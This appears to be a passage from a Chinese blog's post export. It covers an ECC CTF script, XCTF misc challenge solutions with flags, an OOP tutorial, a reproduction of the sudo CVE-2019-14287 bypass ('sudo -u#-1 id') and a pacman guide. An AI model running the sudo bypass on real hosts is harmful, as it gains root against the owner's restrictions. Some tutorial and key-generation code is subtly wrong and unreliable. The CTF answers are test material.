ZeroDivisionError('division by zero') if k &lt; 0: # k ** -1 = p - (-k) ** -1 (mod p) return p - inverse_mod(-k, p) # Extended Euclidean algorithm. s, old_s = 0, 1 t, old_t = 1, 0 r, old_r = p, k while r != 0: quotient = old_r // r old_r, r = r, old_r - quotient * r old_s, s = s, old_s - quotient * s old_t, t = t, old_t - quotient * t gcd, x, y = old_r, old_s, old_t assert gcd == 1 assert (k * x) % p == 1 return x % p# Functions that work on curve points #########################################def is_on_curve(point): """Returns True if the given point lies on the elliptic curve.""" if point is None: # None represents the point at infinity. return True x, y = point return (y * y - x * x * x - curve.a * x - curve.b) % curve.p == 0def point_neg(point): """Returns -point.""" assert is_on_curve(point) if point is None: # -0 = 0 return None x, y = point result = (x, -y % curve.p) assert is_on_curve(result) return resultdef point_add(point1, point2): """Returns the result of point1 + point2 according to the group law.""" assert is_on_curve(point1) assert is_on_curve(point2) if point1 is None: # 0 + point2 = point2 return point2 if point2 is None: # point1 + 0 = point1 return point1 x1, y1 = point1 x2, y2 = point2 if x1 == x2 and y1 != y2: # point1 + (-point1) = 0 return None if x1 == x2: # This is the case point1 == point2. m = (3 * x1 * x1 + curve.a) * inverse_mod(2 * y1, curve.p) else: # This is the case point1 != point2. m = (y1 - y2) * inverse_mod(x1 - x2, curve.p) x3 = m * m - x1 - x2 y3 = y1 + m * (x3 - x1) result = (x3 % curve.p, -y3 % curve.p) assert is_on_curve(result) return resultdef scalar_mult(k, point): """Returns k * point computed using the double and point_add algorithm.""" assert is_on_curve(point) if k &lt; 0: # k * point = -k * (-point) return scalar_mult(-k, point_neg(point)) result = None addend = point while k: if k &amp; 1: # Add. result = point_add(result, addend) # Double. addend = point_add(addend, addend) k &gt;&gt;= 1 assert is_on_curve(result) return result# Keypair generation and ECDHE ################################################def make_keypair(): """Generates a random private-public key pair.""" private_key = curve.n public_key = scalar_mult(private_key, curve.g) return private_key, public_keyprivate_key, public_key = make_keypair()print("private key:", hex(private_key))print("public key: (0x&#123;:x&#125;, 0x&#123;:x&#125;)".format(*public_key)) 1234567891011121314$python ecc_calKey.pyp=15424654874903a=16546484b=4548674875Gx=6478678675Gy=5636379357093k=546768private key: 0x857d0public key: (0xcb19fe553fa, 0x50545408eb4)$python&gt;&gt;&gt; 0x50545408eb4+0xcb19fe553fa19477226185390&gt;&gt;&gt;]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF-adworld-misc-wp]]></title>
    <url>%2F2019%2F11%2F08%2FXCTF-adworld-misc-wp%2F</url>
    <content type="text"><![CDATA[Misc&amp;WriteUpmsic永远充满了惊喜 攻防世界&amp;Misc新手练习区0x01 this_is_flag 题目描述： Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9} 易知flag为：flag{th1s_!s_a_d4m0_4la9} 0x02 ext3 题目描述： 今天是菜狗的生日，他收到了一个linux系统光盘 下载附件得到一个19.5MB的文件，由于题目是ext3，所以联想到将该文件挂载至linux下 运行mount test /mnt/,然后发现下面有一堆文件 执行find |grep flag，得到./O7avZhikgKgbF/flag.txt 用cat命令查看文件，得到一串字符ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0= 明显的base64编码，转码得到flag：flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj} 但是看官方wp，发现是另外一种做法。 不知道为啥判断附件为img格式，然后用winhex打开该文件搜索flag得到如下 然后解压该文件（我用bandzip没有打开，改后缀为img装载显示光盘映像已损坏），搜索得到flag.txt，然后其他步骤相同 0x03 give_you_flag 题目描述：菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 下载附件，发现是一个gif文件，打开查看发现在最后几秒闪过一个二维码 第一次做傻傻地用了linux下convert命令，将gif转到png，发现50多帧都被拆分成一个个png， 二维码大概在49帧，后面才发现有Stegsolve可以查看图片的每一帧 明显是个二维码，修补其三角定位，得到下图 扫码得到flag：flag{e7d478cf6b915f50ab1277f78502a2c5} 0x04 pdf 题目描述：菜猫给了菜狗一张图，说图下面什么都没有 打开附件是一个pdf，里面是一张图片，推测将pdf转为word格式之后，移走图片，发现flag就在图片底下 易知得到flag：flag{security_through_obscurity} 0x05 stegano 题目描述：菜狗收到了图后很开心，玩起了pdf 提交格式为flag{xxx}，解密字符需小写 打开附件发现一份文档 一开始没有思路，就先用之前的convert命令，将pdf的东西全部复制出来查看，发现 将AB转换为. - 可得到如下 12-.-. --- -. --. .-. .- - ..- .-.. .- - .. --- -. ... --..-- ..-. .-.. .- --. ---... .---- -. ...- .---- ..... .---- -... .-.. ...-- -- ...-- ..... ..... ....- --. ...-- 解摩斯密码得到：CONGRATULATIONSFLAG1NV151BL3M3554G3 flag为：flag{1NV151BL3M3554G3} 0x06 SimpleRAR 题目描述：菜狗最近学会了拼图，这是他刚拼好的，可是却搞错了一块(ps:双图层) 下载完附件，只有一个文件，打开flag.txt ,里面写着flag is not here 打开winhex查看该rar，发现里面还有一个secret.png，然后根据文件头（或者使用rar修复） 将A8 3C 7A 修改为 A8 3C 74 。 然后解压得到secret.png，打开是一个空白图片，便想到用winhex查看。 发现文件头是GIF，将后缀改为.gif，然后用Stegsolve分离出两帧图片，分别是二维码的上下部分，还少定位符，补齐定位符，扫码得到flag：flag：flag{yanji4n_bu_we1shi} 0x07 坚持60s 题目描述：菜狗发现最近菜猫不爱理他，反而迷上了菜鸡 下下来是一个jar包，用java运行，发现是一个小游戏，根据题目联想需要坚持60s。 玩了几次之后手残放弃，然后解压缩文件，用winhex打开文件搜索flag，在/cn/bjsxt/plane/PlaneGameFrame.class里找到 flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}易知是base64编码，base64decode得到flag{DajiDali_JinwanChiji} 第二种办法，我在找到flag后思考这是misc题也不是逆向题，便觉得这游戏肯定有bug，然后根据常识发现右边和下面的边界可以穿过来躲避障碍，但是完全卡入右边界之后无法返回。 之后发现到下边只能卡入一半，于是突发思维，将小方块卡入右下角然后留下了一个小角，发现可以成功躲过60s（记得计时，在60s~70s时主动出去死亡即可，然后成功得到flag明文 0x08 gif 题目描述：菜狗截获了一张菜鸡发给菜猫的动态图，却发现另有玄机 得到一个zip包，查看里面有103张黑白色的图片，联想到二进制。 白色图片代表0，黑色图片代表1。 01100110前八位二进制换算后为 f 证明思路正确。 01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101 二进制转字符串得到 flag：flag{FuN_giF} 0x09 掀桌子 题目描述：菜狗截获了一份报文如下c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2，生气地掀翻了桌子(╯°□°）╯︵ ┻━┻ 题目只有描述中这一段字符串有信息，推测是十六进制，写python的转换代码 每两个一组，将16进制转换为10进制，减去128以后输出 ascii。 得到Hi, FreshDog! The flag is: hjzcydjzbjdcjkzkcugisdchjyjsbdfr 0x0a 如来十三掌 题目描述：菜狗为了打败菜猫，学了一套如来十三掌。 下下来附件是一个docx，发现是一段文字，贼像佛教里的文字 搜索得到这是一种佛语加密，在网站 http://keyfc.net/bbs/tools/tudoucode.aspx 与佛论禅 可以翻译，但是将全文复制到chrome和firefox打开的网站里都解码失败了，后看他的说明，推测应该在复制过程中会将繁体字转换为简体字，这样你复制后的文字已经不是最初的原文了，所以解不出。试验过在MicrosoftEdge中能够成功解码。 解完是一串像base64编码的字符MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9，但是该字符解码得到是一串乱码，然后发现这个字符串需要先用rot13（与题目“如来十三掌”谐音）转一下，然后再base64解码，得到flag。 0x0b base64stego 题目描述：菜狗经过几天的学习，终于发现了如来十三掌最后一步的精髓 打开压缩包，压缩包是伪加密的根据ctf-wiki里直接用winhex改一个标志位，或者用winrar修复即可 是一个stego.txt可以看到很多行的base64编码 解码出来是在wiki百科上对Steganography的解释 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129Steganography is the art and science of writing hidden messages in such a way that no one, apart from the sender and intended recipient, suspects the existence of the message, a form of security through obscurity. The word steganography is of Greek origin and means &quot;concealed writing&quot; from the Greek words steganos meaning &quot;covered or protected&quot;, and graphein meaning &quot;to write&quot;. The first recorded use of the term was in 1499 by Johannes Trithemius in his Steganographia, a treatise on cryptography and steganography disguised as a book on magic. Generally, messages will appear to be something else: images, articles, shopping lists, or some other covertext and, classically, the hidden message may be in invisible ink between the visible lines of a private letter.The advantage of steganography, over cryptography alone, is that messages do not attract attention to themselves. Plainly visible encrypted messages�no matter how unbreakable�will arouse suspicion, and may in themselves be incriminating in countries where encryption is illegal. Therefore, whereas cryptography protects the contents of a message, steganography can be said to protect both messages and communicating parties.Steganography includes the concealment of information within computer files. In digital steganography, electronic communications may include steganographic coding inside of a transport layer, such as a document file, image file, program or protocol. Media files are ideal for steganographic transmission because of their large size. As a simple example, a sender might start with an innocuous image file and adjust the color of every 100th pixel to correspond to a letter in the alphabet, a change so subtle that someone not specifically looking for it is unlikely to notice it.The first recorded uses of steganography can be traced back to 440 BC when Herodotus mentions two examples of steganography in The Histories of Herodotus. Demaratus sent a warning about a forthcoming attack to Greece by writing it directly on the wooden backing of a wax tablet before applying its beeswax surface. Wax tablets were in common use then as reusable writing surfaces, sometimes used for shorthand. Another ancient example is that of Histiaeus, who shaved the head of his most trusted slave and tattooed a message on it. After his hair had grown the message was hidden. The purpose was to instigate a revolt against the Persians.Steganography has been widely used, including in recent historical times and the present day. Possible permutations are endless and known examples include:* Hidden messages within wax tablets: in ancient Greece, people wrote messages on the wood, then covered it with wax upon which an innocent covering message was written.* Hidden messages on messenger&apos;s body: also used in ancient Greece. Herodotus tells the story of a message tattooed on a slave&apos;s shaved head, hidden by the growth of his hair, and exposed by shaving his head again. The message allegedly carried a warning to Greece about Persian invasion plans. This method has obvious drawbacks, such as delayed transmission while waiting for the slave&apos;s hair to grow, and the restrictions on the number and size of messages that can be encoded on one person&apos;s scalp.* In WWII, the French Resistance sent some messages written on the backs of couriers using invisible ink.* Hidden messages on paper written in secret inks, under other messages or on the blank parts of other messages.* Messages written in Morse code on knitting yarn and then knitted into a piece of clothing worn by a courier.* Messages written on the back of postage stamps.* During and after World War II, espionage agents used photographically produced microdots to send information back and forth. Microdots were typically minute, approximately less than the size of the period produced by a typewriter. WWII microdots needed to be embedded in the paper and covered with an adhesive (such as collodion). This was reflective and thus detectable by viewing against glancing light. Alternative techniques included inserting microdots into slits cut into the edge of post cards.* During World War II, a spy for Japan in New York City, Velvalee Dickinson, sent information to accommodation addresses in neutral South America. She was a dealer in dolls, and her letters discussed how many of this or that doll to ship. The stegotext was the doll orders, while the concealed &quot;plaintext&quot; was itself encoded and gave information about ship movements, etc. Her case became somewhat famous and she became known as the Doll Woman.* Cold War counter-propaganda. In 1968, crew members of the USS Pueblo (AGER-2) intelligence ship held as prisoners by North Korea, communicated in sign language during staged photo opportunities, informing the United States they were not defectors but rather were being held captive by the North Koreans. In other photos presented to the US, crew members gave &quot;the finger&quot; to the unsuspecting North Koreans, in an attempt to discredit photos that showed them smiling and comfortable.--http://en.wikipedia.org/wiki/Steganography 推测是base64隐写，跑脚本得到flag：flag{Base_sixty_four_point_five} 1234567891011121314151617181920import base64import sysdef deStego(stegoFile): b64table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" with open(stegoFile,'r') as stegoText: message = "" for line in stegoText: try: text = line[line.index("=") - 1:-1] message += "".join([ bin( 0 if i == '=' else b64table.find(i))[2:].zfill(6) for i in text])[2 if text.count('=') ==2 else 4:6] except: pass return "".join([chr(int(message[i:i+8],2)) for i in range(0,len(message),8)])if __name__ == "__main__": if len(sys.argv) == 2: print(deStego(sys.argv[1])) else: print(deStego("stego.txt")) 0x0c 功夫再高也怕菜刀 题目描述：菜狗决定用菜刀和菜鸡决一死战 下载附件发现是一个.pcapng文件，是一个wireshark流量包。 用wireshark打开，ctrl+F查找flag 发现里面有zip和flag.txt还有6666.jpg。 追踪6666.jpg那一行的TCP请求，右键追踪TCP流 由于图片JPG的文件头是FFD8文件尾是FFD9，将文件另存为 ，然后用文本编辑器，编辑导出的文件，查找并删除第一个jpg文件头（FFD8）和最后一个文件尾（FFD9）之外的字符串，剩下的全是十六进制字符串。然后把十六进制保存为图片，我用的“010 Editor”，打开后新建空白文件，复制图片十六进制字符串到粘贴板，点击菜单栏“Edit-Paste From-Paste From Hex Text”，然后保存为图片就行了，保存后的图片如下图。 刚才看到里面有存在一个hello.zip，便用foremost处理流量包，分理出一个压缩文件，里面就是flag.txt，为加密文件，联想至刚刚那张复原的图片，用密码Th1s_1s_p4sswd_!!!尝试打开文件，得到flag：flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Object-oriented Programming]]></title>
    <url>%2F2019%2F10%2F21%2FObject-oriented-Programming%2F</url>
    <content type="text"><![CDATA[虽然一直再写面向对象编程的语言，但是压根没有对象可以面对，希望写完这篇能有对象可以让我面对！！！ 简介 面向对象编程(Object-oriented Programming,缩写：OOP)是软件工程中一种具有对象概念的编程范式(Programming Paradigm)，同时也是一种程序开发的抽象方针，与之对应的编程范式还有：函数式编程(Functional Programming)、过程式编程(Procedural Programming)、响应式编程(Reactive Programming)等。 面向对象的程序设计（OOP）是面向过程程序设计的继承和发展，它不仅汲取了后者的精华，而且以一种更加接近人类思维的方式来分析和解决问题：程序是对现实世界的抽象和描述，现实世界的基本单元是物体，与之对应的，程序中的基本单元是对象。 面向对象思想认为：现实世界是由对象组成的，无论大到一个国家还是小到一个原子，都是如此。并且对象都由两部分组成： 描述对象状态或属性的数据（变量）以及描述对象行为或者功能的方法（函数）。并且与面向过程不同，面向对象是将数据和操作数据的函数紧密结合，共同构成对象来更加精确地描述现实世界，这是面向过程和面向对象两者最本质的区别。 对象与类在面向对象编程中，最常见的表现就是基于类(Class)来表现的，每一个对象实例都有具体的类，即对象的类型。使用类的面向对象编程也称为基于类的编程(Class-based programming)，如常见的Java，C++；而与之类似的有基于原型的编程(Prototype-based programming)，如JavaScript。 类：定义对象的数据格式(属性类型)和可用过程(方法)，同时也可能包含类成员的数据(如，常量)和过程(如，静态方法)，类其实就是对象的类型/原型(prototype)。 对象：类的实例，通过类实例化出来的具体实例。 面向对象的三大特征 面向对象的三大特征分别是：封装、继承、多态 。 封装(Encapsulation) 通过对象隐藏程序的具体实现细节，将数据与操作包装在一起，对象与对象之间通过消息传递机制实现互相通信（方法调用），具体的表现就是通过提供访问接口实现消息的传入传出。 封装常常会通过控制访问权限来控制对象之间的互访权限，常见的访问权限：公有(public)，私有(private)，保护(protected)。某些语言可能还会提供更加具体的访问控制，如，Java的package。 封装的意义：由于封装隐藏了具体的实现，如果实现的改变或升级对于使用方而言是无感知的，提高程序的可维护性；而且封装鼓励程序员把特定数据与对数据操作的功能打包在一起，有利于应用程序的去耦。 继承(Inheritance) 支持类的语言基本都支持继承，继承即类之间可以继承，通过继承得到的类称为子类，被继承的类为父类，子类相对于父类更加具体化。 子类具有自己特有的属性和方法，并且子类使用父类的方法也可以覆盖(重写)父类方法，在某些语言中还支持多继承，但是也带来了覆盖的复杂性。 继承的意义：继承是代码复用的基础机制 多态(Polymorphism) 多态发生在运行期间，即子类型多态，指的是子类型是一种多态的形式，不同类型的对象实体有统一接口，相同的消息给予不同的对象会引发不同的动作。 多态的意义：提供了编程的灵活性，简化了类层次结构外部的代码，使编程更加注重关注点分离(Separation of concerns，SoC) 关于面向对象编程的设计模式，可以参考谈谈面向对象编程 Python3面向对象编程 参考： 一文看懂Python面向对象编程核心思想(Python学习与Django入门必看) Python3 面向对象 Python面向对象编程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#!/usr/bin/python3class people: #默认为公有变量 name = "" age = 0 #定义私有变量，即在变量前加入 __ __weight = 0 num = 0 #类专有方法，可重写 def __init__(self,n,a,w): self.name = n self.age = a self.__weight = w self.num += 1 #类方法一般第一个参数为self def speak(self): print('I am %s,and I am %d years old' % (self.name,self.age)) @classmethod def tol(cls): print("total numble of people is &#123;&#125;".format(self.num)) #这个为类方法，可直接使用people.tol() #student 继承people类class student(people): grade = "" def __init__(self,n,a,w,g): people.__init__(self,n,a,w) self.grade = g #方法重写 def speak(self): print("I am a %s student.\nMy name is %s" % (self.grade,self.name)) #类的私有方法 def __show_detail(self): print(self.name+"\t"+self.age+"\t"+self.__weight+"\n"+self.grade) #封装 def getWeight(self): return self.weight #python有多重继承class sample(people, student): tag = "" def __init__(self,n,a,w,g,t): people.__init__(self,n,a,w) student.__init__(self,g=g) tag = t s1 = student("Alice",16,47,"7th grades") python提供类的转有方法，可进行方法重写 1234567891011121314151617181920212223242526272829303132__init__ : 构造函数，在生成对象时调用__del__ : 析构函数，释放对象时使用__repr__ : 打印，转换__setitem__ : 按照索引赋值__getitem__: 按照索引获取值__len__: 获得长度__cmp__: 比较运算__call__: 函数调用__add__: 加运算__sub__: 减运算__mul__: 乘运算__truediv__: 除运算__mod__: 求余运算__pow__: 乘方反向运算符重载： __radd__: 加运算__rsub__: 减运算__rmul__: 乘运算__rdiv__: 除运算__rmod__: 求余运算__rpow__: 乘方 复合重载运算符__iadd__: 加运算__isub__: 减运算__imul__: 乘运算__idiv__: 除运算__imod__: 求余运算__ipow__: 乘方 注：__new__()方法python中定义的类在创建实例对象的时候，会自动执行init()方法，但是在执行init()方法之前，会执行new()方法。 new()的作用主要有两个。 1.在内存中为对象分配空间2.返回对象的引用。（即对象的内存地址） python解释器在获得引用的时候会将其传递给init()方法中的self。 12345678class A: def __new__(cls,*args,**kwargs): print('__new__') return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__')a = A() 输出结果 12__new____init__ 我们一定要在new方法中最后调用 1return super().__new__(cls) 否则init方法不会被调用 123456789class A: def __new__(cls,*args,**kwargs): print('__new__') # return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__')a = A() 输出 1__new__ 像以前一样，我们不写new方法试试 123456789class A: # def __new__(cls,*args,**kwargs): # print('__new__') # return super().__new__(cls)#这里一定要返回，否则__init__()方法不会被执行 def __init__(self):#这里的self就是new方法中的return返回值 print('__init__')a = A() 输出 1__init__ 私有属性-封装在实际开发中，对象 的 某些属性或方法 可能只希望 在对象的内部被使用，而 不希望在外部被访问到 定义方式 在 定义属性或方法时，在 属性名或者方法名前 增加 两个下划线__ 实际开发中私有属性也不是一层不变的。所以要给私有属性提供外部能够操作的方法。 7.1) 通过自定义get set方法提供私有属性的访问 12345678910111213141516class Person: def __init__(self, name, age): self.name = name self.__age = age #定义对私有属性的get方法，获取私有属性 def getAge(self): return self.__age #定义对私有属性的重新赋值的set方法，重置私有属性 def setAge(self,age): self.__age = ageperson1 = Person("tom",19)person1.setAge(20)print(person1.name,person1.getAge()) #tom 20 7.2) 调用property方法提供私有属性的访问 12345678910111213141516171819class Student: def __init__(self, name, age): self.name = name self.__age = age #定义对私有属性的get方法，获取私有属性 def getAge(self): return self.__age #定义对私有属性的重新赋值的set方法，重置私有属性 def setAge(self,age): self.__age = age p = property(getAge,setAge) #注意里面getAge,setAge不能带()s1 = Student("jack",22)s1.p = 23 #如果使用=,则会判断为赋值，调用setAge方法。print(s1.name,s1.p) #jack 23 ，直接使用s1.p会自动判断会取值，调用getAgeprint(s1.name,s1.getAge()) #jack 23,这个时候set,get方法可以单独使用。 7.3) 使用property标注提供私有属性的访问 注意： 一旦给函数加上一个装饰器@property,调用函数的时候不用加括号就可以直接调用函数了 12345678910111213141516171819202122232425262728293031class Teacher: def __init__(self, name, age,speak): self.name = name self.__age = age self.__speak = speak @property #注意1.@proterty下面默认跟的是get方法，如果设置成set会报错。 def age(self): return self.__age @age.setter #注意2.这里是使用的上面函数名.setter，不是property.setter. def age(self,age): if age &gt; 150 and age &lt;=0: #还可以在setter方法里增加判断条件 print("年龄输入有误") else: self.__age = age @property def for_speak(self): #注意2.这个同名函数名可以自定义名称，一般都是默认使用属性名。 return self.__speak @for_speak.setter def for_speak(self, speak): self.__speak = speakt1 = Teacher("herry",45,"Chinese")t1.age = 38 #注意4.有了property后，直接使用t1.age,而不是t1.age()方法了。t1.for_speak = "English" print(t1.name,t1.age,t1.for_speak) #herry 38 English C++面向对象编程 引用： c++面向对象程序设计总结(类的使用) C++ 类 &amp; 对象 C++面向对象基础 析构函数析构函是类的一个成员函数，名字由波浪号接类名构成。它没有返回值，也不接受参数： 12345class Foo&#123; public: ~Foo(); //析构函数 //... &#125;; 由于析构函数不接受参数，因此它不能被重载。对于一个给定类，只会由唯一一个析构函数。 在一个构造函数中，成员的初始化时在函数体执行之前完成的，且按照它们在类中出现的顺序进行初始化。在一个析构函数中，首先执行函数体，然后销毁成员。成员按初始化顺序的逆序进行销毁。 无论何时一个对象被销毁，就会自动调用其析构函数： ​ 1.变量在离开其作用域时被销毁​ 2.当一个对象被销毁时，其成员被销毁​ 3.容器(无论是标准容器还是数组)被销毁时，其元素被销毁​ 4.对于动态分配的对象，当对指向它的指针应用delete运算符时被销毁​ 5.对于临时对象，当创建它的完整表达式结束时被销毁 未完待续]]></content>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-14287]]></title>
    <url>%2F2019%2F10%2F18%2FCVE-2019-14287%2F</url>
    <content type="text"><![CDATA[引用： Potential bypass of Runas user restrictions (sudo official page) CVE-2019-14287：sudo权限绕过漏洞分析与复现 Linux Sudo暴userID提权漏洞CVE-2019-14287 sudo 用法简介 第一次复现CVE漏洞，十分滴激动 概述Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。 2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞（CVE-2019-14287）的补丁修复。 利用前提 sudo -v &lt; 1.8.28 知道当前用户的密码 当前用户存在于sudo权限列表 漏洞复现复现是在sudo 1.8.16的版本下进行的，对于低于1.8.28的版本都起作用 1test ALL=(ALL,!root) /usr/bin/id 其中，在sudoers配置中，以上语句代表着test用户，ALL=(ALL,!root)代表指定用户，即所有除root以外的用户都可运行命令/usr/bin/id 一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图（第三张图）所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令 如果想利用该漏洞来实施攻击，用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令（如下图中定义了test用户可用id命令，但不能以root用户执行命令id（test ALL=(ALL,!root) /usr/bin/id））。通常来说，这意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。 如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。 12sudo -u#-1 idsudo -u#4294967295 id 上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。 但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。 漏洞片段 漏洞CVE-2019-14287的源于sudo调用的系统函数setresuid()和setreuid()在参数处理中会将 -1（或其等效的无符号整数4294967295）误认为是 0，而这正好是 root 用户的UserID 。 实际上，只要用户的权限足够高，即拥有最高sudo权限的用户，并且在Runas规范中定义了ALL关键字的话，他们就可以运行Runas规范中明确禁止使用的那些root命令，而且以这种方式运行的命令其日志项所显示的目标用户为4294967295，而不是root。与此同时，在执行相应命令的过程中，PAM会话模块将不会运行。]]></content>
      <categories>
        <category>CVE</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pacman]]></title>
    <url>%2F2019%2F10%2F11%2Fpacman%2F</url>
    <content type="text"><![CDATA[包管理工具 Pacman 参考： Pacman Home Page pacman wiki](https://wiki.archlinux.org/index.php/Pacman_(简体中文)) ArchLinux 的 pacman 命令详解 警告: 在Arch下安装软件包时，未更新#升级软件包)系统前，不要更新软件包数据库（例如，可能出现某软件包不再出现在官方库）。操作时，应使用pacman -Syu *package_name*, 而不要使用（pacman -Sy *package_name*），否则可能会有依赖问题。参见 System maintenance (简体中文)#不支持部分升级#不支持部分升级) 和 BBS#89328. 安装指定的包安装或者升级单个软件包，或者一列软件包（包含依赖包），使用如下命令： 1$ pacman -S package_name1 package_name2 ... 用正则表达式安装多个软件包（参见 pacman 小贴士#巧用Bash语法): invalid section]和这个帖子）： 1$ pacman -S $(pacman -Ssq package_regex) 有时候在不同的软件仓库中，一个软件包有多个版本（比如[extra]和[testing]）。可以选择一个来安装： 1$ pacman -S extra/package_name 安装多个含有相似名称的软件包，而并非整个包组或全部匹配的软件包； 例如，plasma: 1$ pacman -S plasma-&#123;desktop,mediacenter,nm&#125; 当然，可以多层扩展，并不作限制： 1$ pacman -S plasma-&#123;workspace&#123;,-wallpapers&#125;,pa&#125; 安装包组一些包属于一个可以同时安装的软件包组。例如，运行下面的命令 1$ pacman -S gnome 会提醒用户选择 gnome 内需要安装的包。 有的包组包含大量的软件包，有时用户只需其中几个。除了逐一键入序号外，pacman 还支持选择或排除某个区间内的的软件包： 1Enter a selection (default=all): 1-10 15 这将选中序号 1 至 10 和 15 的软件包。而 1Enter a selection (default=all): ^5-8 ^2 将会选中除了序号 5 至 8 和 2 之外的所有软件包。 想要查看哪些包属于 gnome 组，运行： 1$ pacman -Sg gnome 也可以访问 https://www.archlinux.org/groups/ 查看可用的包组。 注意: 如果列表中的包已经安装在系统中，它会被重新安装，即使它已经是最新的。可以用 --needed 选项覆盖这种行为。 删除软件包删除单个软件包，保留其全部已经安装的依赖关系 1$ pacman -R package_name 删除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系： 1$ pacman -Rs package_name 要删除软件包和所有依赖这个软件包的程序: 警告: 此操作是递归的，请小心检查，可能会一次删除大量的软件包。 1$ pacman -Rsc package_name 要删除软件包，但是不删除依赖这个软件包的其他程序： 1$ pacman -Rdd package_name pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件： 1$ pacman -Rn package_name 注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。 升级软件包 警告: * 建议所有用户都经常性的更新系统 Arch 只支持系统完整升级，详细参见不支持部分升级和#安装软件包#安装软件包)。 一个 pacman 命令就可以升级整个系统。花费的时间取决于系统有多老。这个命令会同步非本地(local)软件仓库并升级系统的软件包： 1$ pacman -Syu 查询包数据库pacman 使用 -Q 参数查询本地软件包数据库。参见： 1$ pacman -Q --help 使用 -S 参数来查询远程同步的数据库。参见： 1$ pacman -S --help pacman 可以在包数据库中查询软件包，查询位置包含了软件包的名字和描述： 1$ pacman -Ss string1 string2 ... 有时，-s的内置正则会匹配很多不需要的结果，所以应当指定仅搜索包名，而非描述或其他子段，下面的命令就会返回很多不必要结果: 1$ pacman -Ss '^vim-' 要查询已安装的软件包： 1$ pacman -Qs string1 string2 ... 按文件名查找软件库： 1$ pacman -Fs string1 string2 ... 显示软件包的详尽的信息： 1$ pacman -Si package_name 查询本地安装包的详细信息： 1$ pacman -Qi package_name 使用两个 -i 将同时显示备份文件和修改状态： 1$ pacman -Qii package_name 要获取已安装软件包所包含文件的列表： 1$ pacman -Ql package_name 查询远程库中软件包包含的文件： 1$ pacman -Fl package_name 检查软件包安装的文件是否都存在： 1$ pacman -Qk package_name 两个参数k将会执行一次更彻底的检查。 查询数据库获取某个文件属于哪个软件包： 1$ pacman -Qo /path/to/file_name 查询文件属于远程数据库中的哪个软件包： 1$ pacman -Fo /path/to/file_name 要罗列所有不再作为依赖的软件包(孤立orphans)： 1$ pacman -Qdt 要罗列所有明确安装而且不被其它包依赖的软件包： 1$ pacman -Qet 要显示软件包的依赖树： 1$ pactree package_name 检查一个安装的软件包被那些包依赖，可以使用 pkgtoolsAUR中的whoneeds: 1$ whoneeds package_name 或者pactree中使用-r: 1$ pactree -r package_name 数据库结构pacman数据库通常位于 /var/lib/pacman/sync. 对于每一个在/etc/pacman.conf中指定的软件仓库， 这里都有一个一致的数据库。数据库文件夹里每个tar.gz文件都包含着一个仓库的软件包信息。例如which 包: 1234% tree which-2.20-6 which-2.20-6|-- depends`-- desc 这个 depends 项列出了该软件的依赖包， 而desc有该包的介绍，例如文件大小和MD5值 。 清理软件包缓存pacman 将下载的软件包保存在 /var/cache/pacman/pkg/ 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。 使用内建选项即可清除未安装软件包的缓存： 1$ pacman -Sc 警告: 仅在确定当前安装的软件包足够稳定且不需要降级)时才执行清理。pacman -Sc仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文))中获取了。 pacman -Scc 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。 由于以上种种局限，建议使用专门的脚本去处理清理哪些、清理多少缓存： 